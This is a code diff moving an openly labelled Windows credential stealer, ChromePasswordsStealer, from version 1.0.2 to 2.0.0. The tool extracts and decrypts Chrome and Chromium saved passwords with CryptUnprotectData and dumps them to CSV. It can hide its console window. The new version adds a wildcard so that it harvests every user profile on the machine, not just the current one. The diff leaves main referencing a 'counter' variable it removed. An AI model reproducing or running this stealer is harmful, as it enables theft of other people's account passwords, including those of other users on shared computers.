@@ -3,7 +3,7 @@
 
 ###################
 #    This module steals chrome passwords on Windows.
-#    Copyright (C) 2021, 2022  Maurice Lambert
+#    Copyright (C) 2021, 2022, 2023  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -28,14 +28,12 @@ This module steals chrome passwords on Windows.
 >>> from ChromePasswordsStealer import ChromePasswordsStealer, ChromiumPasswordsStealer
 >>> stealer = ChromePasswordsStealer()
 >>> stealer = ChromiumPasswordsStealer("passwords", True)
->>> stealer.get_database_cursor()
->>> stealer.get_key()
 >>> for url, username, password in stealer.get_credentials(): print(url, username, password)
 ...
 >>> stealer.save_and_clean()
 """
 
-__version__ = "1.0.2"
+__version__ = "2.0.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -45,7 +43,7 @@ license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/ChromePasswordsStealer"
 
 copyright = """
-ChromePasswordsStealer  Copyright (C) 2021, 2022  Maurice Lambert
+ChromePasswordsStealer  Copyright (C) 2021, 2022, 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
@@ -58,11 +56,11 @@ __all__ = ["ChromePasswordsStealer", "ChromiumPasswordsStealer", "main"]
 print(copyright)
 
 from tempfile import TemporaryFile, _get_default_tempdir
+from os.path import join, exists, isfile, basename
 from argparse import ArgumentParser, Namespace
 from win32crypt import CryptUnprotectData
 from win32console import GetConsoleWindow
 from PythonToolsKit.PrintF import printf
-from os.path import join, exists, isfile
 from shutil import copyfile, copyfileobj
 from base64 import b64decode, b16encode
 from collections.abc import Iterator
@@ -77,6 +75,7 @@ from sys import argv, exit
 from platform import node
 from time import strftime
 from io import BytesIO
+from glob import iglob
 from csv import writer
 from json import load
 
@@ -87,9 +86,11 @@ class ChromePasswordsStealer:
     This class steals chrome passwords on Windows.
     """
 
+    counter = 0
+
     def __init__(self, filename: str = None, save_all: bool = False):
         user_data = self.user_data = join(
-            environ["USERPROFILE"],
+            environ["USERPROFILE"].replace(environ.get('USERNAME', basename(environ["USERPROFILE"])), '*'),
             "AppData",
             "Local",
             "Google",
@@ -122,6 +123,7 @@ class ChromePasswordsStealer:
         self.filename = self.get_filename(
             filename or "chrome_passwords", "csv"
         )
+        self.cursor = None
 
     def get_filename(self, filename: str, extension: str) -> str:
 
@@ -215,23 +217,51 @@ class ChromePasswordsStealer:
         writerow = self.tempcsv.writerow
         decrypt_password = self.decrypt_password
 
-        writerow(("URL", "Username", "Password"))
+        writerow(("URL", "Username", "Password", "Path"))
 
-        for (
-            url,
-            user,
-            password,
-        ) in self.cursor.execute(self.requete):
-            password = decrypt_password(password)
-            credentials = (url, user, password)
-            writerow(credentials)
-            yield credentials
+        for directory in iglob(self.user_data):
+            key_file = self.key_file = join(
+                directory,
+                "Local State",
+            )
+            db_path = self.db_path = join(
+                directory,
+                "Default",
+                "Login Data",
+            )
+
+            self.get_database_cursor()
+            self.get_key()
+
+            for (
+                url,
+                user,
+                password,
+            ) in self.cursor.execute(self.requete):
+                password = decrypt_password(password)
+                credentials = (url, user, password, directory)
+                writerow(credentials)
+                yield credentials
+
+            self.free_database()
+
+    def free_database(self) -> None:
+
+        """
+        This function free database cursor and connection.
+        """
+
+        self.cursor.close()
+        self.connection.close()
 
     def save_and_clean(self) -> None:
 
         """
         This function copies and removes temp files and closes connection.
         """
+
+        if self.cursor is None:
+            return None
 
         get_filename = self.get_filename
         tempfile = self.tempfile
@@ -242,9 +272,6 @@ class ChromePasswordsStealer:
             copyfileobj(tempfile, file)
 
         tempfile.close()
-
-        self.cursor.close()
-        self.connection.close()
 
         if self.save_all:
             copyfile(tempdb, get_filename(self.save_db_filename, "db"))
@@ -269,7 +296,7 @@ class ChromiumPasswordsStealer(ChromePasswordsStealer):
         )
 
         user_data = self.user_data = join(
-            environ["USERPROFILE"],
+            environ["USERPROFILE"].replace(environ.get('USERNAME', basename(environ["USERPROFILE"])), '*'),
             "AppData",
             "Local",
             "Google",
@@ -335,7 +362,7 @@ def main(argv: List[str] = argv[1:]) -> int:
     arguments = parse_args()
 
     if not arguments.window:
-        printf = lambda *x: None
+        printf = lambda *x, **y: None
         ShowWindow(GetConsoleWindow(), 0)
     else:
         printf = partial(printf, end="\n")
@@ -345,31 +372,17 @@ def main(argv: List[str] = argv[1:]) -> int:
     stealers = (ChromePasswordsStealer, ChromiumPasswordsStealer)
     filename = arguments.filename
     save_all = arguments.save_all
-    stealer = None
-    counter = 0
-    while not isinstance(stealer, ChromiumPasswordsStealer):
-        stealer = stealers[counter](
-            f"{filename}{counter}" if filename is not None else None, save_all
-        )
-        counter += 1
 
+    for stealer in stealers:
+        stealer = stealer(
+            filename and f"{filename}{counter}", save_all
+        )
         printf(f"Stealer created, save filename: {stealer.filename!r}")
-        printf(
-            f"Get DB path: {stealer.db_path!r}, Key file path: {stealer.key_file!r}",
-            "INFO",
-        )
 
-        if not stealer.get_database_cursor():
-            printf("DB not found...", state="NOK")
-            continue
-
-        printf("DB connection done.")
-
-        key = b16encode(stealer.get_key() or b"").decode("latin-1")
-        printf(f"Get encryption key: {key!r}")
-
-        for url, username, password in stealer.get_credentials():
-            printf(f"Get credentials for {url!r}: {username!r} {password!r}")
+        for url, username, password, directory in stealer.get_credentials():
+            printf("Found credentials in: " + repr(directory))
+            printf("Get encryption key: " + repr(b16encode(stealer.get_key() or b'').decode()))
+            printf(f"Get credentials for {url!r}: {username!r} " + repr(password))
 
         stealer.save_and_clean()
         printf("Temp files are cleaned, credentials are saved.", "INFO")
